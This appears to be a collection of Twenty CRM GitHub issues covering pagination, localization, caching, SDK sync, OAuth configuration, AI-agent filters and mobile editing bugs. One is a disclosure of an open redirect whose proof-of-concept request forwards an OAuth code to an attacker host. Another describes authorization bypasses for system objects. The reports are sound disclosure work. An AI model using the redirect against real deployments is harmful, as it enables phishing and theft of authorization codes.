Follow-up to #24333 / #24354 / #24356, splitting out a pre-existing gap those PRs deliberately did not touch.

## Problem

Ordering by TEXT fields uses `LOWER(field)` and SELECT/MULTI_SELECT uses `LOWER(field::text)` (`shouldUseCaseInsensitiveOrder` / `shouldCastToText` in `build-order-by-column-expression.util.ts`), but the cursor continuation filter compares the raw column value (`field > :cursorValue` via `computeWhereConditionParts`). The keyset predicate and the ORDER BY therefore disagree about the ordering relation.

Consequences when paginating with a cursor:

- **TEXT**: rows whose values differ from the cursor value only by case sit at a `LOWER()`-tie that the raw `>` comparison resolves differently, so records near case boundaries (e.g. `acme` / `ACME`) can be duplicated or skipped across page boundaries, collation-dependent.
- **SELECT**: worse, the raw comparison `enum_column > 'VALUE'` uses the enum's declaration order while the ORDER BY sorts by the lowercased text, so the two orders can diverge wholesale, not just at ties.

This affects root-level sorts and relation-target sorts (e.g. `orderBy: { company: { name: ... } }`) alike.

## Fix direction

The continuation filter needs to compare the same expression the ORDER BY uses, e.g. `LOWER(field) > LOWER(:cursorValue) OR (LOWER(field) = LOWER(:cursorValue) AND <next-key continuation>)` for case-insensitive fields, with the `::text` cast for SELECT. That likely means teaching `computeWhereConditionParts` (or a cursor-specific variant) about `useLower`/`castToText` so the ORDER BY parser and the cursor filter share those flags, the same way #24354 made them share the orderBy field resolution.

Note the two `order-by-relation-field.integration-spec.ts` case-insensitivity tests are also sensitive to the database collation of the test environment; while fixing this it is worth pinning the comparison semantics so they pass regardless of collation.
items.title: Cursor keyset conditions compare raw values while ORDER BY uses LOWER() for TEXT/SELECT fields

## Bug Description

I checked all three Japanese locale files in full (5,730 entries total — parsed with multiline-aware tooling, counts cross-checked with a second method):

| File | Entries | Untranslated (empty msgstr) |
| --- | --- | --- |
| `twenty-front/src/locales/ja-JP.po` | 3,859 | 404 (10.5%) |
| `twenty-server/.../i18n/locales/ja-JP.po` | 1,805 | 132 |
| `twenty-emails/src/locales/ja-JP.po` | 66 | 2 |
| Total | 5,730 | 538 (9.4%) |

So roughly one string in ten renders in English inside the Japanese UI.

### Where the untranslated strings cluster

They are concentrated in newer feature areas — the pattern looks like features shipping ahead of their translations: AI/Agents ("Agent interactions will appear here once the agent is used in conversations"), roles and permissions ("Assign roles to specify access permissions", "Add permission", "Admin"), billing/onboarding ("Book a 30-minute call and we'll help you get your workspace production-ready"), and the email-change verification ("Confirm new email") — a trust-sensitive moment to fall back to English.

### The bare "Record" label contradicts its own established term

The translated portion of the UI is impressively consistent: record is 「レコード」 in 76 strings. Exactly two deviate to 「記録」:

| msgid | Current | Should be |
| --- | --- | --- |
| `Record` | 記録 | レコード |
| `This role can {humanReadableAction} all records` | すべての記録に対して… | すべてのレコードに対して… |

The first one is the worst possible place for the deviation: the bare label, shown in menus and headers. A CRM's most fundamental noun, correct in 76 places, wrong on the label itself. (記録 reads as "a recording/log", not a CRM record.) Two-line fix, outsized effect.

### Minor: duplicated English source strings

`{permissionLabel} permission removed` and `{permissionLabel} Permission removed` both exist (differing only in capitalization, both currently untranslated). Merging them would save every locale a duplicate.

## Expected behavior

No English strings inside the Japanese UI, and 「レコード」 used consistently for the core noun, including the bare `Record` label.

## Technical inputs

Checked against `main`, 2026-08-14, on the locale .po files directly (not through the running app). A case-sensitive consistency check across all 3,859 front entries found zero conflicting translations for the same English string — terminology in the translated 90% is genuinely well kept. The gap is volume, not quality.

I am a native Japanese speaker and I do localization QA professionally. Happy to submit the two-line Record fix right away, and to work through the 538 empty entries via Crowdin or PR — whichever fits your workflow.

## Summary

Reordering a single column in a record-table view performs a **1 ms, single-row `UPDATE`** on `core."viewField"`, then spends **another 230–440 ms** in post-commit cache invalidation — recomputing five flat entity maps, **including `flatObjectMetadataMaps` and `flatFieldMetadataMaps`**. A view-field *position* change cannot affect object or field metadata, so that portion of the invalidation appears unnecessary.

The cost scales with total workspace metadata size, so it degrades as a workspace grows. On our workspace the drag interaction is visibly laggy.

## Environment

- Twenty **v2.27.0** (community edition), self-hosted
- Docker Compose, official `twentycrm/twenty:v2.27.0` image
- PostgreSQL 16, Redis
- Single node, single workspace
- No enterprise key, no SSO

## Workspace scale

| entity | count |
|---|---|
| objects (`core."objectMetadata"`) | 38 |
| fields (`core."fieldMetadata"`) | 787 |
| views (`core.view`) | 67 |
| view fields (`core."viewField"`) | 714 |

Of these, 9 objects / 82 fields / 26 relations are custom; the rest are standard.

## Reproduction

1. Open any record-table view with several columns.
2. Drag a column to a new position.
3. Observe the server log (this build already emits `[install-perf]` timings — no log-level change required).

Repeated 3× in a single session.

## Measured timing breakdown

Per-drag, from the server's own `[install-perf]` instrumentation:

| stage | drag 1 | drag 2 | drag 3 |
|---|---|---|---|
| `EntityBuilder viewField` validateAndBuild | 0.5 ms | 0.4 ms | 0.4 ms |
| `buildWorkspaceMigration` | 38.6 ms | 38.8 ms | 15.0 ms |
| Runner initial cache retrieval (5 keys) | 3.0 ms | 0.1 ms | 0.1 ms |
| DB transaction total (incl. commit) | 6.2 ms | 18.5 ms | 18.4 ms |
| slowest action `update:viewField` | 1.7 ms | 1.0 ms | 1.0 ms |
| **post-commit cache invalidation** | **437.2 ms** | **308.6 ms** | **232.8 ms** |
| **total execution** | **447.5 ms** | **327.9 ms** | **251.8 ms** |
| invalidation as % of total | **97.7 %** | **94.1 %** | **92.5 %** |

Representative log excerpt (identifiers replaced with placeholders):

```
LOG [EntityBuilder viewField] validateAndBuild: 0.5ms
LOG [WorkspaceMigrationValidateBuildAndRunService] [install-perf] buildWorkspaceMigration took 38.6ms (status=success)
LOG [WorkspaceMigrationValidateBuildAndRunService] [install-perf] validateBuildAndRunWorkspaceMigrationFromTo running 1 actions: {"update:viewField":1}
LOG [Runner] [install-perf] Runner initial cache retrieval (getOrRecomputeManyOrAllFlatEntityMaps) took 3.0ms for 5 flat-maps keys
LOG [BaseWorkspaceMigrationRunnerActionHandlerService] update_viewField executeForWorkspaceSchema: 0.3ms
LOG [BaseWorkspaceMigrationRunnerActionHandlerService] update_viewField executeForMetadata: 1.4ms
LOG [Runner] [install-perf] Runner transaction summary: 1 actions, total transaction 6.2ms (commit 4.3ms), slowest action update:viewField 1.7ms
LOG [Runner] Cache invalidation flatViewFieldMaps,flatFieldMetadataMaps,flatViewMaps,flatViewFieldGroupMaps,flatObjectMetadataMaps: 437.2ms
LOG [Runner] [install-perf] Runner post-commit invalidateCache took 437.3ms for 5 flat-maps keys
LOG [Runner] Total execution: 447.5ms
```

Note the migration action set is exactly `{"update:viewField":1}` — one action.

## Database-side evidence

The write itself is negligible; the read amplification is not.

`pg_stat_user_tables` for `core."viewField"`, before → after three drags:

```
n_tup_upd: 30 → 33      (+3 — exactly one row update per drag)
```

`pg_stat_database` deltas across the same three drags:

```
tup_returned: +230,582   (~77,000 rows read per drag)
tup_fetched:  +196,176
blks_hit:     +364,186
xact_commit:  +1,488
```

So a **single 1 ms row update** is accompanied by roughly **77,000 rows read**. (Caveat: a small amount of background cron activity is included in the database-wide counters, so treat these as an upper bound — but the order of magnitude holds, and the per-drag `Cache invalidation` timing is measured directly and independently.)

GraphQL schema regeneration (`GqlTypeGenerator`) did **not** fire during any drag — 0 occurrences — so this is specifically the flat-entity-map recompute, not schema rebuilding.

## Observed invalidation set

```
flatViewFieldMaps, flatFieldMetadataMaps, flatViewMaps,
flatViewFieldGroupMaps, flatObjectMetadataMaps
```

## Suggested narrow fix

Scope post-commit invalidation to the maps an action can actually affect. For `update:viewField` (and specifically a `position`-only change):

- **invalidate:** `flatViewFieldMaps`
- **arguably invalidate:** `flatViewMaps`, `flatViewFieldGroupMaps` (if view-level or grouping-derived state depends on field order)
- **do not invalidate:** `flatObjectMetadataMaps`, `flatFieldMetadataMaps` — a view-field position change cannot alter object or field metadata

Dropping those two should remove the large majority of the recompute, since they are the two largest maps in a metadata-heavy workspace.

## Possibly timely

#23778 (*instrument the local metadata cache and cap heavy providers by entry count*) and #23751 (*export event-loop delay and workspace-cache recompute metrics*) add instrumentation to this exact cache. If the team is already gathering occupancy and recompute metrics, this report may provide a concrete, reproducible workload for that work: a one-row, 1 ms update that triggers a full recompute of the two heaviest providers.

Happy to supply further traces or test a patch against this workspace.

This is a follow-up to #23062. These concerns were raised in [the follow-up comment](https://github.com/twentyhq/twenty/issues/23062#issuecomment-5072682134)(https://github.com/twentyhq/twenty/issues/23062#issuecomment-5072682134), but were not addressed by the fix merged in #23280.

#23280 changes the role-cache precedence so that an explicit object-permission value is retained instead of being overwritten by the system-object default. However, the current code still contains two separate `isSystem` authorization bypasses.

## 1. Non-workflow, non-workspace-member system objects still ignore deny-all role defaults

The role cache first initializes CRUD values from the role-wide defaults, then resolves each non-workflow, non-workspace-member object as:

```ts
overrideValue ?? (isSystem ? true : defaultValue);
```

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/metadata-modules/role/services/workspace-roles-permissions-cache.service.ts#L137-L201

Therefore, when a system object has no explicit object-permission row, `isSystem` forces `canRead`, `canUpdate`, `canSoftDelete`, and `canDestroy` to `true`, even if all corresponding role-wide defaults are `false`.

For example, a role with:

```ts
{
  canReadAllObjectRecords: false,
  canUpdateAllObjectRecords: false,
  canSoftDeleteAllObjectRecords: false,
  canDestroyAllObjectRecords: false,
  objectPermissions: [],
}
```

still receives full cached CRUD permissions for a non-workflow, non-workspace-member system object such as `message`.

The regression test added in #23280 explicitly asserts this behavior: it creates a system `message` object with no override and expects every CRUD permission to be `true`.

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/metadata-modules/role/services/__tests__/workspace-roles-permissions-cache.service.spec.ts#L327-L343

The adjacent test confirms that #23280 preserves an explicit `false` value in the cache:

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/metadata-modules/role/services/__tests__/workspace-roles-permissions-cache.service.spec.ts#L345-L370

That is a cache-precedence fix, but it does not make deny-all role defaults apply to these system objects.

## 2. The ORM still bypasses object- and field-permission enforcement for most system objects

`validateOperationIsPermittedOrThrow` still returns before it reads the object permission map or runs the operation and field checks:

```ts
if (objectMetadataIsSystem && !isWorkspaceMemberObject) {
  return;
}
```

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/twenty-orm/repository/permissions.utils.ts#L116-L149

The return occurs before the `select`, `insert`, `update`, `delete`, `restore`, and `soft-delete` permission checks. It also occurs before `validateReadFieldPermissionOrThrow` and `validateUpdateFieldPermissionOrThrow` are called.

Consequently, the explicit-override cache fix in #23280 does not by itself make normal ORM paths enforce an override for these objects: the ORM validator still returns early based solely on `isSystem`.

## Existing trusted-context bypass is already separate

The code already has a specific bypass for `SystemAuthContext`:

```ts
if (isSystemAuthContext(authContext)) {
  return { shouldBypassPermissionChecks: true };
}
```

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/twenty-orm/utils/resolve-role-permission-config.util.ts#L18-L32

User and API-key contexts resolve to role IDs instead:

https://github.com/twentyhq/twenty/blob/a0281f635bda14f12801c972d5f40d23fbc2ad28/packages/twenty-server/src/engine/twenty-orm/utils/resolve-role-id-from-auth-context.util.ts#L18-L30

The generic `isSystem` bypass therefore remains an additional authorization bypass for normal role-based contexts.

## Expected behavior

For normal user and API-key contexts, non-workflow system objects should use the role defaults unless there is an explicit object-level override:

```text
role object permission → row-level permission → field permission
```

Trusted internal operations may continue to use the existing `SystemAuthContext` / `shouldBypassPermissionChecks` bypass.

# SDK sync fails after columns are added in the UI and only suggests uninstalling the entire app

## Description

After syncing an app using `twenty-sdk`, adding columns to one of the affected views through the Twenty UI can cause subsequent app syncs to fail with a `viewField` metadata conflict.

Example error:

```text
Sync failed with error: Migration action 'create' for 'viewField'
(universalIdentifier: b5182123-xxxx-xxxx-xxxx-59aed4573bbc) failed

Hint: a metadata conflict was detected. Preview the plan with
`yarn twenty dev --once --dry-run`; if it persists, run
`yarn twenty app:uninstall -y` then sync again.
```

The suggested recovery action is disproportionately destructive. Uninstalling the app removes all metadata owned by the application and may remove app-owned objects and their data, even though the conflict concerns only one `viewField`.

## Steps to reproduce

1. Sync a Twenty SDK app that contributes fields or view fields.
2. Open the relevant view in the Twenty UI.
3. Add one or more columns through the UI.
4. Run the app sync again.
5. The sync attempts to create a conflicting `viewField` and fails.

## Actual behaviour

The error identifies only the metadata type and universal identifier.

The CLI then recommends previewing the plan and, if the problem persists, uninstalling and reinstalling the entire app.

There is no supported way to:

* inspect the existing conflicting metadata entity;
* delete only the conflicting entity;
* associate the existing UI-created entity with the app manifest;
* preserve the local UI configuration while continuing the rest of the sync.

## Expected behaviour

Adding a column through the UI should not require the entire app to be uninstalled.

At minimum, the synchroniser should provide actionable information about both sides of the conflict:

* object and view names;
* field label and API name;
* manifest universal identifier;
* existing metadata identifier;
* ownership or origin of the existing entity;
* reason the create operation conflicts.

Where an existing `viewField` targets the same view and field as the manifest entity, the synchroniser should preferably update or adopt that entity rather than attempting to create a duplicate.

## Suggested conflict-resolution workflow

Provide a scoped repair or conflict-resolution command, for example:

```bash
yarn twenty app:repair
```

The user could then resolve each conflict individually using options such as:

* **Adopt existing** — associate the UI-created metadata entity with the app manifest.
* **Delete existing** — remove only the conflicting metadata entity.
* **Keep local** — retain the UI entity and skip that manifest change.
* **Replace existing** — explicitly replace the existing entity with the manifest definition.
* **Regenerate identifier** — generate a new identifier where this is safe.

## Bug Description

Front component widgets show "No Data" on custom object record pages, but work correctly on standard object pages (e.g., CalendarEvent). The root cause is that the `FindOne{ObjectName}` core GraphQL query fails with "Data validation error" due to auto-generated morph relations from other installed apps.

## Steps to Reproduce

1. Install multiple apps that add morph relations (attachments, noteTargets, taskTargets, timelineActivities) to all objects
2. Create a custom object via `defineObject`
3. Add a page layout with a FRONT_COMPONENT widget via `definePageLayout`
4. Open a record of the custom object

**Result:** "No Data" shown for the FRONT_COMPONENT widget. The `FindOneDocumentTemplate` query returns `null` with `"Data validation error"`.

**Expected:** The front component should render successfully.

## Evidence

### 1. Front component works on standard object (CalendarEvent)

Created a minimal test app that adds a FRONT_COMPONENT tab to the CalendarEvent page layout:

```ts
// fc-test app — adds tab to standard CalendarEvent layout
definePageLayoutTab({
  pageLayoutUniversalIdentifier: 'b9b10e40-9ce2-4704-8ac6-c6e92e2563c1', // CalendarEvent layout
  layoutMode: PageLayoutTabLayoutMode.CANVAS,
  widgets: [{
    type: 'FRONT_COMPONENT',
    configuration: {
      configurationType: 'FRONT_COMPONENT',
      frontComponentUniversalIdentifier: '...',
    },
  }],
});
```

**Result:** "FRONT_COMPONENT WORKS!" renders correctly with green text. Console logs confirm the component mounts, gets record IDs, and renders.

### 2. Front component fails on custom object (DocumentTemplate)

Same front component pattern on a custom object layout:

```ts
definePageLayout({
  objectUniversalIdentifier: DOCUMENT_TEMPLATE_OBJECT_UNIVERSAL_IDENTIFIER,
  tabs: [{
    layoutMode: PageLayoutTabLayoutMode.CANVAS,
    widgets: [{
      type: 'FRONT_COMPONENT',
      configuration: {
        configurationType: 'FRONT_COMPONENT',
        frontComponentUniversalIdentifier: '...',
      },
    }],
  }],
});
```

**Result:** "No Data" — the front component never mounts. Console shows no component logs.

### 3. FindOneDocumentTemplate query fails

The browser's Network tab shows the core API query returns:

```json
{
  "data": { "documentTemplate": null },
  "errors": [{
    "message": "Data validation error.",
    "extensions": { "code": "INTERNAL_SERVER_ERROR" }
  }]
}
```

This query includes auto-generated morph relation fields (attachments, noteTargets, taskTargets, timelineActivities) that reference tables from other installed apps. The validation fails on these cross-app references.

### 4. Server environment

- Twenty version: 2.18.0 (Docker `twentycrm/twenty:latest`)
- SDK version: 2.18.0
- 6+ apps installed: intake, advanced-task, Talqui Chat, YBH Activity, and others
- Each app adds morph relations to ALL custom objects
- The `FindOneDocumentTemplate` query includes these morph fields and fails validation

### 5. Metadata is correct

Verified via metadata API:
- Front components registered correctly (`__typename: 'FrontComponentConfiguration'`)
- `frontComponentId` matches registered components
- REST endpoint serves built JS (200, ~200KB)
- Widget configuration in page layout is correct

### 6. All front components return "Forbidden" for `FindOneFrontComponentDocument`

The `frontComponent(id:)` metadata query returns "Forbidden resource" for ALL front components on the server (both ours and other apps). This prevents the `FrontComponentRenderer` from fetching the component details, so it returns null and shows "No Data".

## Impact

- Custom object record pages with FRONT_COMPONENT widgets are unusable
- The issue only affects servers with multiple apps that add cross-app morph relations
- Standard object layouts work fine
- This blocks any app that creates custom objects with front component page layouts

## Workaround

Use HTTP routes for preview functionality instead of FRONT_COMPONENT widgets in page layouts.

## Environment

- Twenty: 2.18.0 (Docker)
- SDK: 2.18.0
- Apps installed: intake (4 front components), advanced-task, Talqui Chat, YBH Activity, Documents & Templates
- Node: 20.20.2
- OS: Ubuntu 22.04 (WSL1)

## Related

- Previously filed: #22563 (universalIdentifier vs database PK mismatch)

## Summary

Google OAuth login was generating a `redirect_uri` using an old internal hostname even though the running Docker container environment had the correct `AUTH_GOOGLE_CALLBACK_URL`.

The stale value was found persisted in Postgres in:

```text
core.keyValuePair
key = AUTH_GOOGLE_CALLBACK_URL
```

Updating that DB value to the current public callback URL fixed Google login immediately.

This may be an upgrade/migration/config-precedence issue affecting long-running self-hosted installs.

---

## Environment

- Deployment: Self-hosted Docker / Docker Compose
- Database: Postgres / RDS
- Twenty version: `v2.18.x`
- Install history: long-running instance originally started around Twenty `v1.0` and upgraded over time
- Multi-workspace: please fill in if relevant: `true/false`

---

## Deployment history / timeline

This instance was originally deployed around Twenty `v1.0`.

For approximately the first two weeks after initial deployment, the instance used an internal hostname as the access URL:

```text
https://old-internal-host.example.com
```

After that initial period, the deployment was changed to the current public hostname:

```text
https://app.example.com
```

The Docker/.env values were updated at that time, including:

```text
AUTH_GOOGLE_CALLBACK_URL=https://app.example.com/auth/google/redirect
AUTH_GOOGLE_APIS_CALLBACK_URL=https://app.example.com/auth/google-apis/get-access-token
```

The application continued working for months after this change.

However, after later upgrades/configuration changes, Google OAuth began generating a `redirect_uri` using the old internal hostname.

---

## Expected behavior

If `AUTH_GOOGLE_CALLBACK_URL` is provided in the runtime/container environment, Google OAuth should use that current environment value.

Alternatively, if DB-backed config is expected to override runtime env vars, this precedence should be clearly documented and there should be an official/supported way to refresh or resync DB-backed config values from env.

Expected Google OAuth redirect URI:

```text
https://app.example.com/auth/google/redirect
```

---

## Actual behavior

The running Docker container had the correct environment variable:

```text
AUTH_GOOGLE_CALLBACK_URL=https://app.example.com/auth/google/redirect
```

But the Google OAuth URL generated by Twenty used the old internal hostname:

```text
https://old-internal-host.example.com/auth/google/redirect
```

The stale hostname was not found in:

- active container environment checks, other than the correct current env value
- container filesystem search
- Docker volume search
- Redis search

It was found in Postgres:

```text
core.keyValuePair
key = AUTH_GOOGLE_CALLBACK_URL
value = https://old-internal-host.example.com/auth/google/redirect
```

Updating that DB-backed value fixed the OAuth redirect.

---

## Evidence / troubleshooting performed

A request to the Google auth route returned a redirect containing the old internal hostname.

Example sanitized curl result:

```bash
curl -sSI 'https://app.example.com/auth/google?action=list-available-workspaces' | grep -i 'location'
```

Returned:

```text
Location: https://accounts.google.com/o/oauth2/v2/auth?...&redirect_uri=https%3A%2F%2Fold-internal-host.example.com%2Fauth%2Fgoogle%2Fredirect&...
```

Bypassing the CDN/proxy and hitting the app locally also returned the old hostname, confirming this was generated by the app/backend and not by CDN caching:

```bash
curl -sSI 'http://127.0.0.1/auth/google?action=list-available-workspaces' \
  -H 'Host: app.example.com' \
  -H 'X-Forwarded-Proto: https' \
  | grep -i 'location'
```

Returned:

```text
Location: https://accounts.google.com/o/oauth2/v2/auth?...&redirect_uri=https%3A%2F%2Fold-internal-host.example.com%2Fauth%2Fgoogle%2Fredirect&...
```

The running container env showed the current expected value:

```text
AUTH_GOOGLE_CALLBACK_URL=https://app.example.com/auth/google/redirect
AUTH_GOOGLE_APIS_CALLBACK_URL=https://app.example.com/auth/google-apis/get-access-token
```

A broad read-only DB search found the old hostname in:

```text
core.keyValuePair.value
```

Then a targeted query showed:

```sql
SELECT
  id,
  "key",
  "value"::text AS value_text,
  "createdAt",
  "updatedAt",
  "deletedAt"
FROM core."keyValuePair"
WHERE "value"::text ILIKE '%old-internal-host.example.com%';
```

Result included:

```text
key   = AUTH_GOOGLE_CALLBACK_URL
value = "https://old-internal-host.example.com/auth/google/redirect"
```

---

## Workaround / fix used

The following DB-backed value was updated:

From:

```text
https://old-internal-host.example.com/auth/google/redirect
```

To:

```text
https://app.example.com/auth/google/redirect
```

After updating the row in `core.keyValuePair`, Google login started using the correct redirect URI.

In this case, no server restart was required.

---

## Questions

1. Is `core.keyValuePair.AUTH_GOOGLE_CALLBACK_URL` expected to override the runtime/container `AUTH_GOOGLE_CALLBACK_URL` env var?
2. If yes, can this precedence be documented more clearly?
3. If no, should startup/config loading prefer the runtime env var or resync the DB-backed value?
4. Is there an official/supported way to refresh DB-backed config values from Docker env?
5. Are other auth-related environment variables also persisted in `core.keyValuePair` and potentially subject to stale values?
6. Should an upgrade migration or startup warning detect stale callback URLs in `core.keyValuePair` when they differ from the current env?

---

## Why this matters

This can break Google OAuth unexpectedly on long-running self-hosted installs where:

1. The app was first deployed with hostname A.
2. The deployment later changed to hostname B.
3. Docker env values were updated to hostname B.
4. A stale hostname A value remained in `core.keyValuePair`.
5. A later version/config behavior began using the stale DB-backed value for OAuth.

At minimum, it would be helpful to document the precedence between runtime env vars and DB-backed config. Ideally, Twenty would either keep these values synced or warn when DB-backed OAuth callback values differ from current env values.
```
items.title: Stale DB-backed AUTH_GOOGLE_CALLBACK_URL used for Google OAuth instead of current Docker env after upgrades

I am reporting an open-redirect-with-OAuth-code-passthrough finding in
`/auth/oauth-propagator/callback`, live-validated against `twentycrm/twenty:latest`
(commit `18296005`).

**Root cause**:

`OAuthPropagatorController.propagateOAuthCallback` (at
`packages/twenty-server/src/engine/core-modules/auth/controllers/oauth-propagator.controller.ts`)
accepts `state` and `code` query parameters, treats `state` as the redirect URL, and 302s to
that URL with `code` and `state` appended after an `isValidDomain` check. The check defers to
`WorkspaceDomainsService.getWorkspaceByOriginOrDefaultWorkspace(url.href)`. In single-workspace
mode (`IS_MULTIWORKSPACE_ENABLED = false`, the default), `resolveWorkspaceAndPublicDomain`
returns the default workspace and ignores the origin, so the check passes for any hostname.

**Live PoC** (default Docker compose stack, single-workspace mode, one workspace created via
the UI):

```
GET /auth/oauth-propagator/callback?state=https%3A%2F%[2Fattacker.example.com](http://2fattacker.example.com/)%2Fphish&code=STOLEN_CODE_ABC123

HTTP/1.1 302 Found
Location: https://attacker.example.com/phish?code=STOLEN_CODE_ABC123&state=https%3A%2F%2Fattacker.example.com%2Fphish
```

**Impact**:

- Default deployments: open redirect using the trusted Twenty origin (phishing primitive).
- Deployments using the propagator as designed (i.e. operator has registered
  `…/auth/oauth-propagator/callback` as the `redirect_uri` at an upstream OAuth provider):
  any attacker who can initiate an OAuth flow with `state=[https://attacker.com/`](https://attacker.com/) can
  intercept the victim's authorization code by hosting an attacker page that captures the
  inbound `code` query parameter.

**Fix**: In `isValidDomain`, do not accept the default-workspace fall-through. Explicitly
match `url.hostname` against existing `workspace.subdomain` or `workspace.customDomain`
values. Alternatively, gate the controller behind `IS_MULTIWORKSPACE_ENABLED` since the
propagator pattern is meaningless when there is only one workspace.

**Severity**:
- Default deployments: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N = 4.7 Medium
- Deployments using propagator with upstream OAuth: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N = 7.6 High

### Summary

When an AI agent (Ask AI / agent chat) is asked to find or read records in a way that leads the model to filter on text, `FindRecordsService` passes the LLM-generated `filter` straight to the query runner, which throws in the filter arg processor. The error is caught (the turn recovers), but it wastes a tool call and makes text-search of RICH_TEXT fields (notes, about, bodyV2) impossible.

### Environment

- Self-hosted via Docker, `twentycrm/twenty:latest` (digest `sha256:05799b9d…`, pulled ~2026-05-19).
- Provider: OpenAI, model `openai/gpt-5.4` (smart default).
- Default built-in **Helper** agent (it has record-search tools enabled).

### Steps to reproduce

1. Configure an AI provider and open Ask AI / agent chat.
2. Ask something that makes the model search/read by text, e.g. **"What are <Person>'s notes?"**
3. The agent locates the person, then attempts to filter on text fields.

### Observed (twenty-server worker logs)

```
[ChatExecutionService] Starting chat execution with model openai/gpt-5.4, 5 active tools
[FindRecordsService] Found 1 records in person
ERROR [FindRecordsService] Failed to find records: Error: Object person doesn't have any "ilike" field.
ERROR [FindRecordsService] Failed to find records: Error: Object person doesn't have any "like" field.
ERROR [FindRecordsService] Failed to find records: Error: Sub field "ilike" not found for composite type: RICH_TEXT
```

### Analysis

`record-crud/services/find-records.service.js` → `FindRecordsService.execute` forwards the LLM-provided `filter` to `commonFindManyRunner.execute`, and the throws originate in `common-args-processors/filter-arg-processor`. Two distinct invalid shapes the model produces:

1. **Operator at field position** — e.g. `{ "ilike": "…" }` placed at the filter root or directly inside `and`/`or`/`not`, where a field name is expected → *"Object X doesn't have any 'ilike' field"*. Comparison operators can never legitimately appear at object level, so this is always invalid and safe to reject/strip.
2. **Text operator on a composite field** — e.g. `{ notes: { ilike: "…" } }` where `notes`/`about`/`bodyV2` are `RICH_TEXT` composites → *"Sub field 'ilike' not found for composite type: RICH_TEXT"*. This blocks any attempt to text-search rich fields.

### Impact

Non-fatal (the catch returns `{ success: false }` and the agent continues), but: a wasted tool round-trip (~15s / ~$0.10 observed on a single turn), and rich-text fields are effectively unsearchable by the agent.

### Suggested fix

Sanitize / validate AI-tool filters by field type before execution (in `FindRecordsService` or, better, in the tool's filter schema so the model can't emit them):

- Reject/strip comparison operators that appear at object-level positions (root, `and`/`or`/`not` children).
- Restrict text operators (`ilike`, `like`) to scalar text fields; never apply them to composite/`RICH_TEXT` fields — or expose composite sub-fields appropriately.

Field metadata is already available in `FindRecordsService.execute` (`flatFieldMetadataMaps` from the context builder), so a type-aware sanitize is feasible at that layer. Alternatively, constrain the find tool's JSON schema / system guidance so the model doesn't generate these.
items.title: AI agent record search throws on LLM-generated filters (ilike on RICH_TEXT / operator at object level)

## Bug: Native rich-text field is unusable on mobile with soft keyboard open + long content

**Affects:** Mobile web (iOS Safari / Android Chrome), record field of type `FieldMetadataType.RICH_TEXT` (BlockNote-based), opened from the Fields widget in record detail.

---

### Bug Description

When a record field of type rich-text contains more content than fits the visible viewport **and** the soft keyboard is open on a mobile device:
1. **The "expand to fullscreen" trigger is unreachable** — covered or pushed out of the visible area by the keyboard, with no way to scroll to or activate it.
2. **The content area scrolls erratically** under the keyboard — positioning the cursor precisely is difficult or impossible.
3. **The user cannot read the existing field content while editing** — the visible area shrinks to a few lines and scrolling behaviour is unreliable.

There is no apparent gesture, button, or configuration option to enter a reliable fullscreen edit mode on mobile once the keyboard is open.

---

### Steps to Reproduce

1. Create a custom field of type rich-text on any object (e.g. on `Company`).
2. Open a record of that object and add enough content to the rich-text field to exceed one screen of text.
3. Open the same record on a mobile device (iOS Safari or Android Chrome).
4. In the Fields widget of the record detail, tap the rich-text field to open the editor — soft keyboard opens.
5. Try to scroll through the existing content, reach the fullscreen trigger, or place the cursor in a specific location.

**Expected:** A fullscreen / modal edit mode activates automatically (or via an always-visible, keyboard-aware trigger) so the user can comfortably read and edit longer content on mobile.

**Actual:** The visible editing area shrinks to a few lines, the fullscreen trigger is inaccessible, and scrolling is unreliable.

---

### Why This Matters

Since FRONT_COMPONENT widgets cannot reliably use `<input>` / `<textarea>` for user-editable text (Worker bridge filters `value` / `defaultValue` and related props), the native rich-text field is effectively the only path for editing longer text content inside a record. Mobile usability of this single remaining path is therefore critical for the "edit a longer note from the phone" scenario — which is core CRM territory.

---

### Environment

- **Twenty version tested:** 2.4.0 (we are currently blocked from upgrading by upstream upgrade issues — see #20841 and #20699 — so we cannot verify on v2.7.3 directly)
- **Latest release at time of writing:** v2.7.3 (Docker) / 2.7.0 (npm SDK)
- **Browsers:** iOS Safari 17, Android Chrome 124
- **Devices:** iPhone 15, Pixel 7

---

### Related

- #6913 — Minor bugs in notes pages (mobile viewport clipping)
- #7447 — Minor bug in column scroll in mobile viewport
- PR #11390 — Add Edit Rich Text functionality to table view (`CommandMenuEditRichTextPage`)

---

### Question for Maintainers

Has the native rich-text editor been tested on mobile with longer content + soft keyboard open? If there is a recommended UX pattern (e.g. via `CommandMenuEditRichTextPage` from PR #11390) to enter a true fullscreen edit mode on mobile, it is not currently discoverable from the Fields widget.
items.title: Bug: Native rich-text field is unusable on mobile with soft keyboard open + long content

Introduction:

## Summary

Creating a ChatGPT app/connector against the Twenty MCP endpoint with OAuth support does not complete the connection flow. ChatGPT shows the app as OAuth-supported, but after clicking `Connect`, the app remains disconnected and shows no actions.

## Reproduction

1. In ChatGPT, enable Developer Mode for Apps/Connectors.
2. Create a new app with:
   - Name: `Twenty`
   - MCP Server URL: `https://api.twenty.com/mcp`
   - Authentication: `OAuth`
3. Open the app details page.
4. Click `Connect`.

## Observed behavior

- ChatGPT shows the app as OAuth-supported.
- The app details page still shows the `Connect` button after the flow.
- `Actions` says `No app actions available yet`.
- The connection does not appear to reach a completed authenticated state.

## Expected behavior

- ChatGPT should redirect/open the Twenty OAuth authorization page.
- After the user authorizes, ChatGPT should complete the OAuth callback.
- The app should show as connected and expose Twenty MCP tools/actions.

## Endpoint checks

The public endpoints appear reachable:

- `GET https://api.twenty.com/.well-known/oauth-protected-resource/mcp` returns protected resource metadata with:
  - `resource: https://api.twenty.com/mcp`
  - `authorization_servers: ["https://api.twenty.com"]`
  - scopes `api profile`
